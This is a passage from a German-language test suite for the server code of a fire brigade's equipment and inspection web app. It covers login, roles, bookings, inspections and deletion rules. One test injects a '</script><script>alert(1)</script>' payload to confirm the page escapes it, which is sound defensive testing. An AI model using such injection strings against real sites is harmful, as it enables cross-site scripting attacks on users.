/**
 * Prüfungen des Servercodes – gegen die Attrappe in `attrappe.js`.
 *
 * Jede Prüfung beginnt mit einer frischen Anlage. Geprüft wird über `aufruf()`, die
 * eine Tür, durch die auch der Browser kommt – nicht über die Fachfunktionen
 * dahinter. Sonst bewiese ein grüner Lauf nur, dass die Funktionen tun, was sie tun,
 * und nicht, dass ein Mitglied nicht darf, was es nicht darf.
 */
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { anlage, Attrappe, browserKontext, SRC, serverCode, tagebuchBeispiel, WURZEL } from './umgebung.mjs';

let gesamt = 0;
const fehlschlaege = [];
let abschnitt = '';

function pruefe(bedingung, text, zusatz) {
  gesamt++;
  if (!bedingung) fehlschlaege.push(abschnitt + ': ' + text + (zusatz !== undefined ? '  → ' + JSON.stringify(zusatz).slice(0, 400) : ''));
}
function gleich(ist, soll, text) {
  pruefe(JSON.stringify(ist) === JSON.stringify(soll), text + ' (ist ' + JSON.stringify(ist) + ', soll ' + JSON.stringify(soll) + ')');
}
function teil(name, f) {
  abschnitt = name;
  try {
    f();
  } catch (e) {
    fehlschlaege.push(name + ': AUSNAHME ' + (e.stack || e));
  }
}

/**
 * Eingerichtete Anlage mit Administratorin anna@ff.example – und auf Wunsch den Demo-Daten.
 *
 * Wer anruft, steht im ersten Argument von `rufe`: eine Google-Adresse (das Firmenkonto
 * am Schreibtisch), ein Token (eine Sitzung am Hallengerät) oder `null` (niemand). Das
 * Hallengerät selbst ist bei Google mit einem Konto angemeldet, das kein Mitglied ist.
 */
function bereit(mitDemo) {
  const fehler = [];
  const a = anlage({ fehler });
  a.fehler = fehler;
  a.lauf('einrichten_()');
  a.lauf(`mitSperre_(() => { Speicher_.vergessen(); const v = new Vorgang_(null, true);
    v.einfuegen('mitglieder', { name: 'Anna Admin', email: 'anna@ff.example', kuerzel: 'AA', rolle: 'admin' });
    v.festschreiben(); })`);
  if (mitDemo) a.lauf('demoEinspielen_()');
  const roh = a.rufe;
  a.hallenkonto = 'halle@ff.example';
  a.rufe = (wer, name, args) => {
    if (wer && String(wer).indexOf('@') > 0) {
      a.setzeNutzer(wer);
      return roh(null, name, args);
    }
    a.setzeNutzer(wer ? a.hallenkonto : '');
    return roh(wer, name, args);
  };
  a.admin = 'anna@ff.example';
  a.stand = (wer) => a.rufe(wer || a.admin, 'daten.laden').ergebnis;
  a.ok = (wer, name, args) => {
    const r = a.rufe(wer, name, args);
    if (!r.ok) throw new Error(name + ': ' + r.fehler);
    return r;
  };
  /** Ein Mitglied aufnehmen; zurück kommt seine Adresse – das ist hier der Zugang. */
  a.mitglied = (kurz, rolle) => {
    const email = kurz + '@ff.example';
    a.ok(a.admin, 'mitglieder.speichern', { name: kurz, email: email, kuerzel: kurz, rolle: rolle });
    return email;
  };
  a.blatt = (name) => a.mappe.getSheetByName(name);
  a.geraet = (stand, bez) => stand.geraete.find((g) => g.bezeichnung === bez);
  a.ort = (stand, code) => stand.lagerplaetze.find((l) => l.code === code);
  a.grund = (stand, name) => stand.gruende.find((g) => g.name === name);
  a.protokoll = () => {
    const sh = a.blatt('Protokoll');
    const w = sh.getDataRange().getValues();
    const kopf = w[0];
    return w.slice(1).map((z) => Object.fromEntries(kopf.map((k, i) => [k, z[i]])));
  };
  return a;
}

// ═══════════════════════════════ Abdrücke ═══════════════════════════════

teil('SHA-256 und HMAC der Attrappe gegen node:crypto', () => {
  // Abdrücke von Ausweis und Gerätegeheimnis hängen daran, dass dies echtes SHA-256 ist.
  for (let i = 0; i < 40; i++) {
    const daten = crypto.randomBytes(i * 7);
    gleich(Buffer.from(Attrappe.sha256(daten)).toString('hex'), crypto.createHash('sha256').update(daten).digest('hex'), 'SHA-256 bei ' + daten.length + ' Byte');
    const k = crypto.randomBytes(i * 3 + 1);
    gleich(Buffer.from(Attrappe.hmacSha256(k, daten)).toString('hex'), crypto.createHmac('sha256', k).update(daten).digest('hex'), 'HMAC bei ' + daten.length + ' Byte');
  }
});

teil('Datumsrechnung', () => {
  const a = anlage();
  gleich(a.lauf("datumPlus_('2026-01-31', 1, 'monate')"), '2026-02-28', '31.1. + 1 Monat = 28.2.');
  gleich(a.lauf("datumPlus_('2028-02-29', 1, 'jahre')"), '2029-02-28', 'Schalttag + 1 Jahr');
  gleich(a.lauf("datumPlus_('2026-03-28', 2, 'tage')"), '2026-03-30', 'über die Zeitumstellung');
  gleich(a.lauf("datumPlus_('2026-08-31', -6, 'monate')"), '2026-02-28', 'rückwärts mit Kappung');
  gleich(a.lauf("tageZwischen_('2026-10-17', '2026-10-10')"), -7, 'Tage zurück');
});

// ═══════════════════════════════ Die Tür ═══════════════════════════════

teil('Nur aufruf() und die Menüs stehen offen', () => {
  // Jede globale Funktion ohne `_` lässt sich über google.script.run aufrufen.
  const offen = [...serverCode().matchAll(/^function\s+([A-Za-z0-9_$]+)\s*\(/gm)].map((m) => m[1]).filter((n) => !n.endsWith('_'));
  gleich(offen.sort(), ['aufruf', 'beiAenderung', 'doGet', 'menueAdministrator', 'menueAdresse', 'menueDemo', 'menueEinrichten', 'menueZwischenspeicher', 'onEdit', 'onOpen'].sort(), 'öffentliche Funktionen');
  const a = bereit(false);
  for (const m of ['menueEinrichten', 'menueAdministrator', 'menueDemo', 'menueAdresse', 'menueZwischenspeicher']) {
    let geworfen = false;
    try {
      a.ctx[m]();
    } catch (e) {
      geworfen = /getUi/.test(e.message);
    }
    pruefe(geworfen, m + ' scheitert ohne Tabellen-Oberfläche');
  }
  const vorher = a.blatt('Mitglieder').getLastRow();
  try {
    a.ctx.menueAdministrator();
  } catch (e) {
    // erwartet
  }
  gleich(a.blatt('Mitglieder').getLastRow(), vorher, 'kein Administrator über die Web-App anlegbar');
});

teil('Ohne Sitzung kein Zugriff, unbekannte Aktionen abgewiesen', () => {
  const a = bereit(true);
  const r = a.rufe(null, 'daten.laden');
  pruefe(!r.ok && r.code === 'kein_zugang' && /Kein Google-Konto/.test(r.fehler), 'ohne Google-Konto: kein Zugang', r);
  const r2 = a.rufe('erfunden', 'daten.laden');
  pruefe(!r2.ok && r2.code === 'abgemeldet', 'erfundenes Hallen-Token: abgemeldet', r2);
  const r3 = a.rufe(a.admin, 'einrichten_');
  pruefe(!r3.ok && /Unbekannte Aktion/.test(r3.fehler), 'interne Funktion ist keine Aktion', r3);
  const r4 = a.rufe(a.admin, 'toString');
  pruefe(!r4.ok, 'Eigenschaften des Objekts sind keine Aktion', r4);
});

teil('doGet liefert die Seite mit allen Teilen', () => {
  const a = bereit(true);
  const seite = a.ctx.doGet();
  const html = seite.getContent();
  pruefe(seite.titel.indexOf('FF Musterstadt') === 0, 'Titel trägt den Wehrnamen', seite.titel);
  gleich(seite.meta.viewport, 'width=device-width, initial-scale=1, viewport-fit=cover', 'viewport');
  pruefe(!/<\?/.test(html), 'keine offenen Vorlagen-Marken');
  pruefe(html.indexOf('function zeichnen()') > 0 && html.indexOf('function halleZeichnen') > 0, 'Oberfläche eingebunden');
  pruefe(html.indexOf('function ableiten_(d)') > 0 && html.indexOf('const VORGABEN_ = ') > 0, 'gemeinsamer Code eingebunden');
  pruefe(html.indexOf('function ableiten_(d)') < html.indexOf('function datenSetzen'), '… vor der Oberfläche');
  const start = JSON.parse(html.match(/window\.START = (.*);/)[1]);
  gleich(start.wehr_name, 'FF Musterstadt', 'START trägt den Wehrnamen');
  pruefe(start.eingerichtet === true, 'eingerichtet');
  // Ein Wehrname mit </script> darf den Block nicht beenden.
  a.ok(a.admin, 'einstellungen.speichern', { werte: { wehr_name: 'FF </script><script>alert(1)</script>' } });
  const html2 = a.ctx.doGet().getContent();
  pruefe(html2.indexOf('</script><script>alert(1)') < 0, 'Wehrname maskiert');
});

// ═══════════════════════════════ Anmeldung ═══════════════════════════════

teil('Das Firmenkonto ist der Zugang', () => {
  const a = bereit(true);
  const fremd = a.rufe('mallory@ff.example', 'daten.laden');
  pruefe(!fremd.ok && fremd.code === 'kein_zugang' && fremd.fehler.indexOf('mallory@ff.example ist hier nicht als Mitglied eingetragen') === 0,
    'fremde Adresse: kein Zugang, mit der Adresse in der Meldung', fremd);
  const gross = a.rufe('ANNA@FF.EXAMPLE', 'daten.laden');
  pruefe(gross.ok && gross.ergebnis.ich.art === 'google' && gross.ergebnis.ich.name === 'Anna Admin', 'Adresse ohne Rücksicht auf Groß/klein', gross.fehler);
  pruefe(![...a.eigenschaften.keys()].some((k) => k.indexOf('sitzung:') === 0), 'am Schreibtisch keine eigenen Sitzungen');
  pruefe([...a.eigenschaften.keys()].includes('gesehen:' + gross.ergebnis.ich.id), '„zuletzt gesehen“ vermerkt');
  pruefe(a.stand().mitglieder.find((m) => m.name === 'Anna Admin').zuletzt_gesehen, '… und dem Administrator gezeigt');
  a.ok(a.admin, 'ausweis.ausgeben', { mitglied: gross.ergebnis.ich.id });
  a.ok(a.admin, 'hallengeraet.anmelden', { name: 'X', geteilt: false, geheimnis: 'Q'.repeat(40) });
  pruefe(!/[0-9a-f]{64}/.test(JSON.stringify(a.stand())), 'keine Abdrücke von Ausweis oder Gerät im Datenstand');
  // Neue Adresse: erst nach der Aufnahme drin.
  pruefe(a.rufe('dieter@ff.example', 'daten.laden').code === 'kein_zugang', 'vorher kein Zugang');
  a.ok(a.admin, 'mitglieder.speichern', { name: 'Dieter Druck', email: ' Dieter@FF.example ', kuerzel: 'dd', rolle: 'mitglied' });
  const dieter = a.rufe('dieter@ff.example', 'daten.laden');
  pruefe(dieter.ok && dieter.ergebnis.ich.kuerzel === 'DD', 'nach der Aufnahme drin, Kürzel groß', dieter.fehler || dieter.ergebnis.ich);
  const doppelt = a.rufe(a.admin, 'mitglieder.speichern', { name: 'X', email: 'dieter@ff.example', rolle: 'mitglied' });
  pruefe(!doppelt.ok && /schon eingetragen/.test(doppelt.fehler), 'Adresse nur einmal', doppelt);
  const kurz = a.rufe(a.admin, 'mitglieder.speichern', { name: 'X', email: 'x@ff.example', kuerzel: 'Dd', rolle: 'mitglied' });
  pruefe(!kurz.ok && /Kürzel hat schon/.test(kurz.fehler), 'Kürzel nur einmal (ohne Rücksicht auf Groß/klein)', kurz);
  const kaputt = a.rufe(a.admin, 'mitglieder.speichern', { name: 'X', email: 'kein-at-zeichen', rolle: 'mitglied' });
  pruefe(!kaputt.ok && /Google-Adresse/.test(kaputt.fehler), 'Adresse muss eine sein', kaputt);
  const dieterId = dieter.ergebnis.ich.id;
  a.ok(a.admin, 'mitglieder.speichern', { id: dieterId, aktiv: false });
  const gesperrt = a.rufe('dieter@ff.example', 'daten.laden');
  pruefe(gesperrt.code === 'kein_zugang' && /gesperrt/.test(gesperrt.fehler), 'gesperrt: sofort draußen', gesperrt);
});

// ═══════════════════════════════ Rechte ═══════════════════════════════

teil('Rollen: Mitglied, Gerätewart, Administrator', () => {
  const a = bereit(true);
  const mitglied = a.mitglied('carla', 'mitglied');
  const wart = a.mitglied('ben', 'geraetewart');
  const s = a.stand(mitglied);
  const pa01 = a.geraet(s, 'PA01');
  const verboten = (token, name, args) => {
    const r = a.rufe(token, name, args);
    return !r.ok && r.code === 'verboten';
  };
  pruefe(verboten(mitglied, 'geraete.speichern', { id: pa01.id, bemerkung: 'x' }), 'Mitglied: keine Stammdaten');
  pruefe(verboten(mitglied, 'pruefungen.erfassen', {}), 'Mitglied: keine Prüfung');
  pruefe(verboten(mitglied, 'protokoll.lesen', {}), 'Mitglied: kein Protokoll');
  pruefe(verboten(mitglied, 'mitglieder.speichern', { name: 'x', email: 'x@ff.example', rolle: 'admin' }), 'Mitglied: niemanden aufnehmen');
  pruefe(verboten(mitglied, 'betrieb.statusSetzen', { geraete: [pa01.id], status: 'defekt' }), 'Mitglied: kein freier Statuswechsel');
  pruefe(verboten(wart, 'mitglieder.speichern', { name: 'x', email: 'x@ff.example', rolle: 'admin' }), 'Gerätewart: niemanden aufnehmen');
  pruefe(verboten(wart, 'einstellungen.speichern', { werte: {} }), 'Gerätewart: keine Einstellungen');
  pruefe(verboten(wart, 'regeln.speichern', {}), 'Gerätewart: keine Regeln ändern');
  pruefe(a.rufe(wart, 'protokoll.lesen', {}).ok, 'Gerätewart: Protokoll lesen');
  // Regeln sieht seit 0.2 jeder: Der Browser sagt damit voraus, was eine Buchung auslöst.
  gleich(s.regeln.length, 2, 'Mitglied bekommt die Regeln (für die Vorhersage)');
  pruefe(verboten(mitglied, 'regeln.loeschen', { id: s.regeln[0].id }), 'Mitglied: Regeln nicht ändern');
  gleich(s.hallengeraete.length, 0, 'Mitglied sieht keine Hallengeräte');
  pruefe(s.mitglieder.every((m) => !('email' in m) && !('kuerzel' in m)), 'Mitglied sieht keine Adressen und Kürzel anderer');
  gleich(s.tabelleUrl, '', 'Mitglied bekommt den Verweis auf die Tabelle nicht');
  // Was ein Mitglied darf: umlagern, zählen, Gereinigt.
  const ziel = a.ort(s, 'LOC-HALLE');
  const r = a.rufe(mitglied, 'betrieb.umlagern', { geraete: [pa01.id], nach: ziel.id, grund: a.grund(s, 'Übung').id });
  pruefe(r.ok && r.ergebnis.gebucht === 1, 'Mitglied bucht', r);
  const pa02 = a.geraet(s, 'PA02');
  pruefe(a.rufe(mitglied, 'betrieb.gereinigt', { geraet: pa02.id }).ok, 'Mitglied hakt „gereinigt“ ab');
  const b03 = a.geraet(s, 'B03');
  const r2 = a.rufe(mitglied, 'betrieb.gereinigt', { geraet: b03.id });
  pruefe(!r2.ok && /zu reinigen/.test(r2.fehler), '„gereinigt“ nur von zu_reinigen aus – nicht für ein defektes Gerät', r2);
  // Rolle entzogen: gilt ab dem nächsten Aufruf.
  const benId = a.stand().mitglieder.find((m) => m.name === 'ben').id;
  a.ok(a.admin, 'mitglieder.speichern', { id: benId, rolle: 'mitglied' });
  pruefe(verboten(wart, 'protokoll.lesen', {}), 'herabgestufte Rolle gilt sofort');
  a.ok(a.admin, 'mitglieder.speichern', { id: benId, aktiv: false });
  gleich(a.rufe(wart, 'daten.laden').code, 'kein_zugang', 'gesperrt: sofort draußen');
});

teil('Der letzte Administrator bleibt', () => {
  const a = bereit(false);
  const ich = a.stand().ich;
  const r = a.rufe(a.admin, 'mitglieder.speichern', { id: ich.id, rolle: 'geraetewart' });
  pruefe(!r.ok && /letzte aktive Administrator/.test(r.fehler), 'nicht herabstufen', r);
  const r2 = a.rufe(a.admin, 'mitglieder.loeschen', { id: ich.id });
  pruefe(!r2.ok, 'nicht selbst löschen', r2);
  const r3 = a.rufe(a.admin, 'mitglieder.speichern', { id: ich.id, aktiv: false });
  pruefe(!r3.ok, 'nicht selbst sperren', r3);
  const r4 = a.rufe(a.admin, 'mitglieder.speichern', { id: ich.id, email: 'neu@ff.example' });
  pruefe(!r4.ok && /eigene Adresse/.test(r4.fehler), 'eigene Adresse nicht selbst ändern', r4);
});

// ═══════════════════════════════ Demo-Daten ═══════════════════════════════

teil('Demo-Daten', () => {
  const a = bereit(true);
  const s = a.stand();
  gleich([s.lagerplaetze.length, s.typen.length, s.plaene.length, s.schritte.length, s.geraete.length, s.saetze.length, s.regeln.length],
    [8, 10, 12, 13, 33, 4, 2], 'Mengen');
  gleich(a.blatt('Buchungen').getLastRow() - 1, 22, '22 Buchungen');
  gleich(a.blatt('Prüfungen').getLastRow() - 1, 39, '39 Prüfungen (alle außer der Reserveflasche)');
  const k = s.kennzahlen;
  gleich([k.ueberfaellig, k.bald, k.zu_reinigen, k.zur_pruefung, k.defekt, k.ohnePlan, k.saetzeUnvollstaendig], [4, 6, 4, 1, 1, 3, 1], 'Kennzahlen');
  gleich(a.geraet(s, 'B03').status, 'defekt', 'B03 defekt gemeldet');
  gleich(ortVon(s, 'B03'), 'Werkstatt Atemschutz', 'B03 in der Werkstatt');
  gleich(s.saetze.map((x) => x.vollstaendigkeit + (x.verteilt ? '/verteilt' : '')), ['vollstaendig', 'vollstaendig/verteilt', 'unvollstaendig', 'vollstaendig/verteilt'], 'vier Sätze, vier Zustände');
  const r = a.rufe(null, 'x');
  pruefe(!r.ok, 'unbekannt');
  let fehler = '';
  try {
    a.lauf('demoEinspielen_()');
  } catch (e) {
    fehler = e.message;
  }
  pruefe(/schon eingespielt/.test(fehler), 'zweiter Lauf verweigert', fehler);
  // In einen benutzten Bestand nicht.
  const b = bereit(false);
  const s2 = b.stand();
  const t = b.ok(b.admin, 'typen.speichern', { name: 'Leiter' }).ergebnis.id;
  const o = b.ok(b.admin, 'lagerplaetze.speichern', { name: 'Lager', typ: 'lager' }).ergebnis.id;
  b.ok(b.admin, 'geraete.speichern', { geraetetyp_id: t, lagerplatz_id: o, bezeichnung: 'L1' });
  let f2 = '';
  try {
    b.lauf('demoEinspielen_()');
  } catch (e) {
    f2 = e.message;
  }
  pruefe(/nicht aus den Demo-Daten/.test(f2), 'verweigert in benutzter Tabelle', f2);
  void s2;
});

function ortVon(s, bez) {
  const g = s.geraete.find((x) => x.bezeichnung === bez);
  return s.lagerplaetze.find((l) => l.id === g.lagerplatz_id).name;
}

// ═══════════════════════════════ Umlagern und Regeln ═══════════════════════════════

teil('Umlagern: Buchung, Status, Regel, Protokoll', () => {
  const a = bereit(true);
  const s = a.stand();
  const lf = a.ort(s, 'LOC-LF10');
  const werk = a.ort(s, 'LOC-WERK');
  const ids = ['PA01', 'M01', 'B03'].map((b) => a.geraet(s, b).id);
  const buchungenVorher = a.blatt('Buchungen').getLastRow();
  const r = a.ok(a.admin, 'betrieb.umlagern', { geraete: ids, nach: werk.id, grund: a.grund(s, 'Einsatz').id, bemerkung: 'E-2026-117' });
  gleich([r.ergebnis.gebucht, r.ergebnis.schonDa], [2, 1], '2 gebucht, B03 stand schon dort');
  gleich(a.blatt('Buchungen').getLastRow() - buchungenVorher, 2, 'zwei Buchungszeilen');
  const n = r.stand;
  gleich(a.geraet(n, 'PA01').status, 'zu_reinigen', 'Einsatz → zu reinigen');
  gleich(ortVon(n, 'PA01'), 'Werkstatt Atemschutz', 'Standort gewechselt');
  // Regel „Nach dem Einsatz prüfen“: der nächste Termin ist heute.
  const m01 = a.geraet(n, 'M01');
  const stand = n.stand.filter((x) => x.geraet_id === m01.id);
  pruefe(stand.every((x) => x.naechste_faellig === n.heute), 'Regel: Prüfung sofort fällig', stand);
  // Defekt bleibt defekt.
  a.ok(a.admin, 'betrieb.umlagern', { geraete: [a.geraet(n, 'B03').id], nach: lf.id, grund: a.grund(s, 'Übung').id });
  gleich(a.geraet(a.stand(), 'B03').status, 'defekt', '„Übung“ schreibt ein defektes Gerät nicht gesund');
  const p = a.protokoll().filter((x) => x.objekt_art === 'geraete' && x.aktion === 'aendern');
  pruefe(p.some((x) => /PA01/.test(x.objekt_text) && /lagerplatz_id/.test(x.details)), 'Standortwechsel im Protokoll', p.slice(-3));
  pruefe(p.every((x) => x.benutzer_name), 'mit Namen');
  // Ohne Grund geht es auch (Server lässt ihn offen), mit stillgelegtem nicht.
  const umr = a.grund(s, 'Umräumen');
  a.ok(a.admin, 'gruende.speichern', { id: umr.id, aktiv: false });
  const r2 = a.rufe(a.admin, 'betrieb.umlagern', { geraete: [ids[0]], nach: lf.id, grund: umr.id });
  pruefe(!r2.ok && /stillgelegt/.test(r2.fehler), 'stillgelegter Grund abgewiesen', r2);
});

teil('Der Standort ändert sich nur durch eine Buchung', () => {
  const a = bereit(true);
  const s = a.stand();
  const g = a.geraet(s, 'PA03');
  const lf = a.ort(s, 'LOC-LF10');
  a.ok(a.admin, 'geraete.speichern', { id: g.id, lagerplatz_id: lf.id, bemerkung: 'geändert' });
  const n = a.stand();
  gleich(a.geraet(n, 'PA03').lagerplatz_id, g.lagerplatz_id, 'Bearbeiten übergeht den Standort');
  gleich(a.geraet(n, 'PA03').bemerkung, 'geändert', 'der Rest wird gespeichert');
  let fehler = '';
  try {
    a.lauf(`(() => { Speicher_.vergessen(); const v = new Vorgang_(null, true); v.aendern('geraete', '${g.id}', { lagerplatz_id: '${lf.id}' }); })()`);
  } catch (e) {
    fehler = e.message;
  }
  pruefe(/über eine Buchung/.test(fehler), 'auch im Vorgang selbst nicht', fehler);
});

// ═══════════════════════════════ Prüfungen ═══════════════════════════════

teil('Prüfung erfassen: Schritte, Termin, Status, Nachweis', () => {
  const a = bereit(true);
  const s = a.stand();
  const la03 = a.geraet(s, 'LA03');
  gleich(la03.status, 'zur_pruefung', 'LA03 wartet in der Werkstatt');
  const plan = s.plaene.find((p) => p.name === 'Halbjahresprüfung' && s.typen.find((t) => t.id === p.geraetetyp_id).name === 'Lungenautomat');
  const r0 = a.rufe(a.admin, 'pruefungen.erfassen', { geraet: la03.id, plan: plan.id, ergebnis: 'bestanden' });
  pruefe(r0.ok, 'Plan ohne Schritte: bestanden ohne Weiteres', r0);
  const n = r0.stand;
  gleich(a.geraet(n, 'LA03').status, 'einsatzbereit', 'Automatik: aus der Werkstatt → einsatzbereit');
  const st = n.stand.find((x) => x.geraet_id === la03.id && x.pruefplan_id === plan.id);
  gleich(st.naechste_faellig, a.lauf(`datumPlus_('${n.heute}', 6, 'monate')`), 'Termin + 6 Monate');
  gleich(st.zuletzt_geprueft, n.heute, 'zuletzt heute');

  // Mit Schritten: Pflicht offen → nicht „bestanden“.
  const pa = a.geraet(n, 'PA03');
  const paPlan = n.plaene.find((p) => p.name === 'Halbjahresprüfung' && p.geraetetyp_id === pa.geraetetyp_id);
  const schritte = n.schritte.filter((x) => x.pruefplan_id === paPlan.id).sort((x, y) => x.position - y.position);
  gleich(schritte.length, 5, 'fünf Schritte');
  const halb = a.rufe(a.admin, 'pruefungen.erfassen', { geraet: pa.id, plan: paPlan.id, ergebnis: 'bestanden', schritte: [{ id: schritte[0].id, ok: true }] });
  pruefe(!halb.ok && /Pflichtschritte offen/.test(halb.fehler), 'offene Pflichtschritte', halb);
  const eingaben = schritte.map((x) => ({ id: x.id, ok: x.art === 'haken' ? true : null, wert: x.art === 'messwert' ? '298' : '', titel: 'GEFÄLSCHT' }));
  const voll = a.ok(a.admin, 'pruefungen.erfassen', { geraet: pa.id, plan: paPlan.id, ergebnis: 'bestanden', schritte: eingaben, bemerkung: 'Dichtung getauscht' });
  const zeile = a.blatt('Prüfungen').getDataRange().getValues().slice(-1)[0].join(' ');
  pruefe(zeile.includes('Hochdruckdichtheit') && !zeile.includes('GEFÄLSCHT'), 'Schritttitel aus dem Plan, nicht vom Browser');
  // Nachweis
  const pdf = a.ok(a.admin, 'pruefungen.nachweis', { id: voll.ergebnis.id }).ergebnis;
  const html = Buffer.from(pdf.base64, 'base64').toString('utf8');
  pruefe(/^Pruefnachweis_IT-PA-0003_\d{4}-\d{2}-\d{2}\.pdf$/.test(pdf.name), 'Dateiname', pdf.name);
  pruefe(html.includes('Prüfnachweis') && html.includes('BESTANDEN') && html.includes('Hochdruckdichtheit') && html.includes('298 bar') && html.includes('Dichtung getauscht'), 'Inhalt des Nachweises');
  pruefe(html.includes('FF Musterstadt'), 'Briefkopf mit Wehrnamen');

  // Nicht bestanden: Termin bleibt, Status defekt (Automatik und Regel).
  const m03 = a.geraet(n, 'M03');
  const mPlan = n.plaene.find((p) => p.geraetetyp_id === m03.geraetetyp_id);
  const vorher = n.stand.find((x) => x.geraet_id === m03.id && x.pruefplan_id === mPlan.id).naechste_faellig;
  const nb = a.ok(a.admin, 'pruefungen.erfassen', { geraet: m03.id, plan: mPlan.id, ergebnis: 'nicht_bestanden', schritte: [] });
  gleich(a.geraet(nb.stand, 'M03').status, 'defekt', 'nicht bestanden → defekt');
  gleich(nb.stand.stand.find((x) => x.geraet_id === m03.id && x.pruefplan_id === mPlan.id).naechste_faellig, vorher, 'Termin bleibt');
  // „unverändert“ ist etwas anderes als „nichts angegeben“.
  const m04 = a.geraet(n, 'M04');
  a.ok(a.admin, 'betrieb.statusSetzen', { geraete: [m04.id], status: 'zur_pruefung' });
  const schritteM = n.schritte.filter((x) => x.pruefplan_id === mPlan.id).map((x) => ({ id: x.id, ok: true, wert: '0,3' }));
  const unv = a.ok(a.admin, 'pruefungen.erfassen', { geraet: m04.id, plan: mPlan.id, ergebnis: 'bestanden', schritte: schritteM, status_danach: 'unveraendert' });
  gleich(a.geraet(unv.stand, 'M04').status, 'zur_pruefung', 'unverändert heißt unverändert');
  // Zukunft und fremder Plan
  const zuk = a.rufe(a.admin, 'pruefungen.erfassen', { geraet: m04.id, plan: mPlan.id, ergebnis: 'nicht_bestanden', datum: '2999-01-01' });
  pruefe(!zuk.ok && /Zukunft/.test(zuk.fehler), 'kein Datum in der Zukunft', zuk);
  const fremd = a.rufe(a.admin, 'pruefungen.erfassen', { geraet: m04.id, plan: paPlan.id, ergebnis: 'nicht_bestanden' });
  pruefe(!fremd.ok && /gehört nicht/.test(fremd.fehler), 'fremder Prüfplan abgewiesen', fremd);
  // Ältere Prüfung nachgetragen: Termin geht nicht zurück.
  const stVorher = unv.stand.stand.find((x) => x.geraet_id === m04.id && x.pruefplan_id === mPlan.id);
  a.ok(a.admin, 'pruefungen.erfassen', { geraet: m04.id, plan: mPlan.id, ergebnis: 'bestanden', schritte: schritteM, datum: '2025-01-01' });
  gleich(a.stand().stand.find((x) => x.id === stVorher.id).naechste_faellig, stVorher.naechste_faellig, 'nachgetragene alte Prüfung verschiebt nichts');
});

teil('Arbeitsliste als PDF', () => {
  const a = bereit(true);
  const pdf = a.ok(a.admin, 'arbeitsliste.pdf', { tage: 30 }).ergebnis;
  const html = Buffer.from(pdf.base64, 'base64').toString('utf8');
  const zeilen = (html.match(/class="kasten"/g) || []).length;
  gleich(zeilen, 4 + 6 + 5, '4 überfällig + 6 bald + 5 Zustände, je mit Kästchen');
  pruefe(html.includes('Erledigt / Kürzel') && html.includes('überfällig'), 'Spalte zum Abzeichnen');
});

teil('Fälligkeit von Hand und abweichendes Intervall', () => {
  const a = bereit(true);
  const s = a.stand();
  const fl02 = a.geraet(s, 'FL02');
  const st = s.stand.find((x) => x.geraet_id === fl02.id && s.plaene.find((p) => p.id === x.pruefplan_id).name === 'Sichtprüfung');
  const r = a.ok(a.admin, 'faelligkeit.aendern', { id: st.id, abw_wert: 6, abw_einheit: 'monate' });
  const neu = r.stand.stand.find((x) => x.id === st.id);
  gleich(neu.naechste_faellig, a.lauf(`datumPlus_('${st.zuletzt_geprueft}', 6, 'monate')`), 'Termin folgt dem neuen Intervall');
  const halb = a.rufe(a.admin, 'faelligkeit.aendern', { id: st.id, abw_wert: 3, abw_einheit: null });
  pruefe(!halb.ok && /Wert und Einheit/.test(halb.fehler), 'Wert ohne Einheit abgewiesen', halb);
  a.ok(a.admin, 'faelligkeit.aendern', { id: st.id, naechste_faellig: '2030-01-01', aktiv: false });
  const aus = a.stand();
  gleich(aus.stand.find((x) => x.id === st.id).naechste_faellig, '2030-01-01', 'Termin von Hand');
  pruefe(!aus.arbeitsliste.some((x) => x.id === st.id), 'abgeschaltet: nicht in der Arbeitsliste');
  pruefe(a.protokoll().some((p) => p.objekt_art === 'plan_stand' && /FL02/.test(p.objekt_text)), 'Änderung von Hand im Protokoll');
});

// ═══════════════════════════════ Stammdaten und Verweise ═══════════════════════════════

teil('Verweise: restrict, cascade, null', () => {
  const a = bereit(true);
  const s = a.stand();
  const lager = a.ort(s, 'LOC-LAGER');
  const r = a.rufe(a.admin, 'lagerplaetze.loeschen', { id: lager.id });
  pruefe(!r.ok && /stehen noch Geräte/.test(r.fehler), 'Lagerplatz mit Geräten bleibt', r);
  const halle = a.ort(s, 'LOC-HALLE');
  const r2 = a.rufe(a.admin, 'lagerplaetze.loeschen', { id: halle.id });
  pruefe(!r2.ok && /hängen noch andere/.test(r2.fehler), 'Lagerplatz mit Unterplätzen bleibt', r2);
  const typ = s.typen.find((t) => t.name === 'Feuerwehrhelm');
  const r3 = a.rufe(a.admin, 'typen.loeschen', { id: typ.id });
  pruefe(!r3.ok && /Geräte dieses Typs/.test(r3.fehler), 'Typ mit Geräten bleibt', r3);
  const pa01 = a.geraet(s, 'PA01');
  const r4 = a.rufe(a.admin, 'geraete.loeschen', { id: pa01.id });
  pruefe(!r4.ok && /ausmustern/.test(r4.fehler), 'Gerät mit Geschichte bleibt', r4);
  // Ein frisches Gerät geht – samt Fälligkeiten und Satzbestückung.
  const neu = a.ok(a.admin, 'geraete.speichern', { geraetetyp_id: pa01.geraetetyp_id, lagerplatz_id: lager.id, bezeichnung: 'PA99' }).ergebnis.id;
  const satz = s.saetze.find((x) => x.name === 'AS-Satz 3');
  a.ok(a.admin, 'saetze.hinzufuegen', { satz: satz.id, geraete: [neu] });
  pruefe(a.stand().stand.filter((x) => x.geraet_id === neu).length === 2, 'zwei Fälligkeiten (Halbjahr, Grundüberholung)');
  a.ok(a.admin, 'geraete.loeschen', { id: neu });
  const n = a.stand();
  pruefe(!n.stand.some((x) => x.geraet_id === neu), 'Fälligkeiten mitgelöscht');
  pruefe(!n.saetze.find((x) => x.id === satz.id).teile.includes(neu), 'aus dem Satz genommen');
  // Ein Grund mit Buchungen: Die Buchungen behalten den Namen.
  const einsatz = a.grund(s, 'Einsatz');
  a.ok(a.admin, 'gruende.loeschen', { id: einsatz.id });
  const b = a.ok(a.admin, 'betrieb.buchungen', { geraet: a.geraet(s, 'PA02').id }).ergebnis.eintraege;
  pruefe(b.some((x) => x.grund_name === 'Einsatz' && !x.grund_id), 'Buchung behält den Grund als Text', b);
  // Ein Prüfplan geht, seine Prüfungen bleiben.
  const sicht = s.plaene.find((p) => p.name === 'Sichtprüfung');
  a.ok(a.admin, 'plaene.loeschen', { id: sicht.id });
  const akte = a.ok(a.admin, 'geraete.akte', { id: a.geraet(s, 'FL01').id }).ergebnis;
  pruefe(akte.pruefungen.some((p) => p.plan_name === 'Sichtprüfung' && !p.pruefplan_id), 'Nachweis bleibt, Verweis leer');
});

teil('Eindeutigkeit und Pflichtfelder', () => {
  const a = bereit(true);
